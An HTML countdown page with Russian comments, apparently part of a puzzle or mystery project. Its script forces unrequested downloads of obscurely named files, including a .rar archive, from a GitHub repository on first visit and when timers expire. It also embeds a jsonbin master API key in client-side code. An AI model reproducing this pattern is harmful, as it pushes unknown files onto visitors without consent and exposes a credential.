<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>##### 2 Project</title>
    <style>
        body {
            background: #000;
            color: #ff0000;
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            gap: 50px;
        }
        
        .countdown-container {
            text-align: center;
        }
        
        .countdown-large {
            font-size: 5rem;
            font-weight: bold;
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .countdown-small {
            font-size: 3rem;
            font-weight: bold;
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
            opacity: 0.9;
        }
        
        .unit {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .value-large {
            font-size: 6rem;
            line-height: 1;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
            min-width: 120px;
        }
        
        .value-small {
            font-size: 4rem;
            line-height: 1;
            text-shadow: 0 0 12px rgba(255, 0, 0, 0.6);
            min-width: 90px;
        }
        
        .separator-large {
            font-size: 4rem;
            margin: 0 5px;
            color: #990000;
        }
        
        .separator-small {
            font-size: 3rem;
            margin: 0 4px;
            color: #990000;
            opacity: 0.8;
        }
        
        @media (max-width: 768px) {
            .countdown-large { font-size: 3rem; }
            .value-large { font-size: 4rem; min-width: 80px; }
            .separator-large { font-size: 3rem; }
            .countdown-small { font-size: 2rem; }
            .value-small { font-size: 2.5rem; min-width: 60px; }
            .separator-small { font-size: 2rem; }
        }
        
        @media (max-width: 480px) {
            body { gap: 30px; }
            .countdown-large { font-size: 2rem; gap: 5px; }
            .value-large { font-size: 3rem; min-width: 60px; }
            .separator-large { font-size: 2rem; }
            .countdown-small { font-size: 1.5rem; gap: 4px; }
            .value-small { font-size: 2rem; min-width: 45px; }
            .separator-small { font-size: 1.5rem; }
        }
        
        .save-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: #ff0000;
            font-size: 0.9rem;
            opacity: 0.7;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="save-status" id="saveStatus"></div>

    <!-- Таймеры -->
    <div class="countdown-container">
        <div class="countdown-large" id="countdown-large"></div>
    </div>
    
    <div class="countdown-container">
        <div class="countdown-small" id="countdown-small"></div>
    </div>

    <script>
        // =============================================
        // НАСТРОЙКИ JSONBIN.IO
        // =============================================
        const JSONBIN_CONFIG = {
            // ЗАРЕГИСТРИРУЙСЯ НА jsonbin.io И СОЗДАЙ BIN
            // ПОТОМ ВСТАВЬ СЮДА СВОИ ДАННЫЕ:
            BIN_ID: '69a5aa37ae596e708f58238c', // Например: '67c3f3c8ad19ca34f801a2b3'
            API_KEY: '$2a$10$ATdsZXLgwLxuNX32UIsJR.yg84Kv/N.HRf7uzeXjlfCQBWOV1NFxS', // Найди в настройках аккаунта
            MASTER_KEY: '$2a$10$ATdsZXLgwLxuNX32UIsJR.yg84Kv/N.HRf7uzeXjlfCQBWOV1NFxS' // Тоже в настройках
        };

        const API_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_CONFIG.BIN_ID}`;

        // =============================================
        // ФУНКЦИИ ДЛЯ РАБОТЫ С JSONBIN
        // =============================================
        async function loadServerState() {
            try {
                const response = await fetch(API_URL, {
                    headers: {
                        'X-Master-Key': JSONBIN_CONFIG.MASTER_KEY
                    }
                });
                const data = await response.json();
                return data.record;
            } catch (error) {
                console.log('Не удалось загрузить с сервера, использую локальные данные');
                return null;
            }
        }

        async function saveServerState(state) {
            try {
                const response = await fetch(API_URL, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': JSONBIN_CONFIG.MASTER_KEY
                    },
                    body: JSON.stringify(state)
                });
                
                if (response.ok) {
                    document.getElementById('saveStatus').textContent = '✓ Сохранено на сервере';
                    setTimeout(() => {
                        document.getElementById('saveStatus').textContent = '';
                    }, 2000);
                }
            } catch (error) {
                console.log('Ошибка сохранения на сервере');
            }
        }

        // =============================================
        // ПЕРЕНАПРАВЛЕНИЕ НА about:blank ЧЕРЕЗ 15 МИНУТ
        // =============================================
        setTimeout(function() {
            window.location.href = 'about:blank';
        }, 900000);

        // =============================================
        // ПЕРВОЕ СКАЧИВАНИЕ ПРИ ЗАХОДЕ НА САЙТ
        // =============================================
        (function firstDownload() {
            const firstDownloadDone = localStorage.getItem('firstDownloadDone');
            
            if (!firstDownloadDone) {
                fetch('https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/For Auto Download')
                    .then(response => {
                        if (!response.ok) throw new Error('Файл не найден');
                        return response.blob();
                    })
                    .then(blob => {
                        const newBlob = new Blob([blob], { type: 'application/octet-stream' });
                        
                        const link = document.createElement('a');
                        link.href = URL.createObjectURL(newBlob);
                        link.download = 'For Auto Download';
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                        URL.revokeObjectURL(link.href);
                        console.log('✅ Первый файл скачан при заходе');
                        
                        localStorage.setItem('firstDownloadDone', 'true');
                    })
                    .catch(err => {
                        console.log('❌ Ошибка при первом скачивании:', err);
                        localStorage.setItem('firstDownloadDone', 'error');
                    });
            }
        })();

        // =============================================
        // ФУНКЦИИ ТАЙМЕРОВ
        // =============================================
        
        function getEndDateLarge() {
            const date = new Date();
            date.setUTCHours(14, 0, 0, 0);
            if (date < new Date()) {
                date.setDate(date.getDate() + 1);
            }
            date.setDate(date.getDate() + 19); // ИЗМЕНЕНО: 19 дней вместо 21
            return date;
        }
        
        function getEndDateForStage(daysFromNow) {
            const date = new Date();
            date.setUTCHours(14, 0, 0, 0);
            if (date < new Date()) {
                date.setDate(date.getDate() + 1);
            }
            date.setDate(date.getDate() + daysFromNow);
            return date;
        }
        
        // ИЗМЕНЕНО: удалён первый этап (2 дня)
        const stages = [
            { days: 3, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/Is.png', filename: 'Is.png' },
            { days: 2, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/mp3/Null.null', filename: 'Null.null' },
            { days: 4, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/A.F.E..jpg', filename: 'A.F.E..jpg' },
            { days: 3, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/Null.null', filename: 'Null.null' },
            { days: 3, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/txt/Null.rar', filename: 'Null.rar' },
            { days: 3, url: 'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/I\'m so sorry', filename: 'Im so sorry' }
        ];
        
        // =============================================
        // ЗАГРУЗКА СОСТОЯНИЯ (СНАЧАЛА С СЕРВЕРА, ПОТОМ ИЗ LOCALSTORAGE)
        // =============================================
        async function initializeState() {
            // Пробуем загрузить с сервера
            const serverState = await loadServerState();
            
            let saved;
            if (serverState) {
                // Используем данные с сервера
                saved = serverState;
                console.log('✅ Загружено с сервера');
            } else {
                // Если сервер недоступен, грузим из localStorage
                saved = loadState();
                console.log('📦 Загружено из localStorage');
            }
            
            return saved;
        }
        
        function loadState() {
            const savedStage = localStorage.getItem('timerStage');
            const savedEndTime = localStorage.getItem('timerEndTime');
            const savedActive = localStorage.getItem('timerActive');
            const savedCompleted = localStorage.getItem('timerCompleted');
            const savedLargeCompleted = localStorage.getItem('largeTimerCompleted');
            const savedLargeEndTime = localStorage.getItem('largeTimerEndTime');
            
            return {
                stage: savedStage !== null ? parseInt(savedStage) : null,
                endTime: savedEndTime !== null ? parseInt(savedEndTime) : null,
                active: savedActive !== null ? savedActive === 'true' : null,
                completed: savedCompleted !== null ? savedCompleted === 'true' : false,
                largeCompleted: savedLargeCompleted !== null ? savedLargeCompleted === 'true' : false,
                largeEndTime: savedLargeEndTime !== null ? parseInt(savedLargeEndTime) : null
            };
        }
        
        function saveState(stage, endTime, active, completed, largeCompleted, largeEndTime) {
            // Сохраняем в localStorage
            if (stage !== null) localStorage.setItem('timerStage', stage.toString());
            if (endTime !== null) localStorage.setItem('timerEndTime', endTime.toString());
            if (active !== null) localStorage.setItem('timerActive', active.toString());
            localStorage.setItem('timerCompleted', completed ? 'true' : 'false');
            localStorage.setItem('largeTimerCompleted', largeCompleted ? 'true' : 'false');
            if (largeEndTime !== null) localStorage.setItem('largeTimerEndTime', largeEndTime.toString());
            
            // Сохраняем на сервер
            const serverState = {
                stage,
                endTime,
                active,
                completed,
                largeCompleted,
                largeEndTime
            };
            saveServerState(serverState);
        }
        
        function processStagesFromStorage(saved) {
            if (saved.completed) {
                return {
                    stage: stages.length,
                    endTime: 0,
                    active: false,
                    completed: true
                };
            }
            
            if (!saved.active || saved.stage === null || saved.endTime === null) {
                return null;
            }
            
            let currentStage = saved.stage;
            let currentEndTime = saved.endTime;
            const now = Date.now();
            
            while (now > currentEndTime && currentStage < stages.length) {
                currentStage++;
                
                if (currentStage >= stages.length) {
                    saveState(stages.length, 0, false, true, saved.largeCompleted, saved.largeEndTime);
                    return {
                        stage: stages.length,
                        endTime: 0,
                        active: false,
                        completed: true
                    };
                }
                
                const nextEndDate = getEndDateForStage(stages[currentStage].days);
                currentEndTime = nextEndDate.getTime();
            }
            
            saveState(currentStage, currentEndTime, true, false, saved.largeCompleted, saved.largeEndTime);
            
            return {
                stage: currentStage,
                endTime: currentEndTime,
                active: true,
                completed: false
            };
        }
        
        // =============================================
        // ИНИЦИАЛИЗАЦИЯ
        // =============================================
        let currentStage, timerActive, endDateSmall, timerCompleted;
        let largeTimerCompleted = false;
        let endDateLarge;
        
        // Асинхронная инициализация
        (async function() {
            const saved = await initializeState();
            
            // Восстанавливаем состояние верхнего таймера
            if (saved.largeCompleted) {
                largeTimerCompleted = true;
                endDateLarge = null;
            } else if (saved.largeEndTime) {
                endDateLarge = new Date(saved.largeEndTime);
                if (Date.now() >= saved.largeEndTime) {
                    downloadFile(
                        'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/rar/Null.null',
                        'Null.null'
                    );
                    
                    largeTimerCompleted = true;
                    endDateLarge = null;
                    saveState(
                        saved.stage, 
                        saved.endTime, 
                        saved.active, 
                        saved.completed, 
                        true, 
                        null
                    );
                }
            } else {
                endDateLarge = getEndDateLarge();
                saveState(
                    saved.stage, 
                    saved.endTime, 
                    saved.active, 
                    saved.completed, 
                    false, 
                    endDateLarge.getTime()
                );
            }
            
            // Обрабатываем нижний таймер
            const processedState = processStagesFromStorage(saved);
            
            if (processedState) {
                currentStage = processedState.stage;
                timerActive = processedState.active;
                timerCompleted = processedState.completed;
                endDateSmall = processedState.active ? new Date(processedState.endTime) : null;
            } else {
                currentStage = 0;
                timerActive = true;
                timerCompleted = false;
                endDateSmall = getEndDateForStage(stages[0].days);
                saveState(currentStage, endDateSmall.getTime(), timerActive, false, largeTimerCompleted, endDateLarge ? endDateLarge.getTime() : null);
            }
            
            // Запускаем таймеры после инициализации
            setInterval(() => {
                updateCountdownLarge();
                updateCountdownSmall();
            }, 1000);
            
            updateCountdownLarge();
            updateCountdownSmall();
        })();
        
        function goToNextStage() {
            const stage = stages[currentStage];
            downloadFile(stage.url, stage.filename);
            
            currentStage++;
            
            if (currentStage >= stages.length) {
                timerActive = false;
                timerCompleted = true;
                endDateSmall = null;
                saveState(stages.length, 0, false, true, largeTimerCompleted, endDateLarge ? endDateLarge.getTime() : null);
                return;
            }
            
            endDateSmall = getEndDateForStage(stages[currentStage].days);
            saveState(currentStage, endDateSmall.getTime(), timerActive, false, largeTimerCompleted, endDateLarge ? endDateLarge.getTime() : null);
        }
        
        function updateCountdownLarge() {
            if (largeTimerCompleted) {
                document.getElementById('countdown-large').innerHTML = `
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                `;
                return;
            }
            
            const now = new Date();
            
            if (now >= endDateLarge) {
                downloadFile(
                    'https://raw.githubusercontent.com/EG-3310/------Project/refs/heads/main/content/rar/Null.null',
                    'Null.null'
                );
                
                largeTimerCompleted = true;
                endDateLarge = null;
                saveState(
                    currentStage, 
                    endDateSmall ? endDateSmall.getTime() : null, 
                    timerActive, 
                    timerCompleted, 
                    true, 
                    null
                );
                
                document.getElementById('countdown-large').innerHTML = `
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                    <div class="separator-large">:</div>
                    <div class="unit"><div class="value-large">00</div></div>
                `;
                return;
            }
            
            const timeLeft = endDateLarge - now;
            
            const days = Math.max(0, Math.floor(timeLeft / (1000 * 60 * 60 * 24)));
            const hours = Math.max(0, Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)));
            const minutes = Math.max(0, Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60)));
            const seconds = Math.max(0, Math.floor((timeLeft % (1000 * 60)) / 1000));
            
            document.getElementById('countdown-large').innerHTML = `
                <div class="unit"><div class="value-large">${days.toString().padStart(2, '0')}</div></div>
                <div class="separator-large">:</div>
                <div class="unit"><div class="value-large">${hours.toString().padStart(2, '0')}</div></div>
                <div class="separator-large">:</div>
                <div class="unit"><div class="value-large">${minutes.toString().padStart(2, '0')}</div></div>
                <div class="separator-large">:</div>
                <div class="unit"><div class="value-large">${seconds.toString().padStart(2, '0')}</div></div>
            `;
        }
        
        function updateCountdownSmall() {
            if (!timerActive || timerCompleted) {
                document.getElementById('countdown-small').innerHTML = `
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                `;
                return;
            }
            
            const now = new Date();
            const timeLeft = endDateSmall - now;
            
            if (timeLeft <= 0) {
                goToNextStage();
                
                document.getElementById('countdown-small').innerHTML = `
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                    <div class="separator-small">:</div>
                    <div class="unit"><div class="value-small">00</div></div>
                `;
                return;
            }
            
            const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
            
            document.getElementById('countdown-small').innerHTML = `
                <div class="unit">
                    <div class="value-small">${days.toString().padStart(2, '0')}</div>
                </div>
                <div class="separator-small">:</div>
                <div class="unit">
                    <div class="value-small">${hours.toString().padStart(2, '0')}</div>
                </div>
                <div class="separator-small">:</div>
                <div class="unit">
                    <div class="value-small">${minutes.toString().padStart(2, '0')}</div>
                </div>
                <div class="separator-small">:</div>
                <div class="unit">
                    <div class="value-small">${seconds.toString().padStart(2, '0')}</div>
                </div>
            `;
        }
        
        function downloadFile(url, filename) {
            fetch(url)
                .then(response => {
                    if (!response.ok) throw new Error('Файл не найден');
                    return response.blob();
                })
                .then(blob => {
                    const newBlob = new Blob([blob], { type: 'application/octet-stream' });
                    
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(newBlob);
                    link.download = filename;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(link.href);
                    console.log(`✅ Скачан ${filename} в ${new Date().toLocaleTimeString()}`);
                })
                .catch(err => console.log('❌ Ошибка загрузки:', err));
        }
    </script>
</body>
</html>
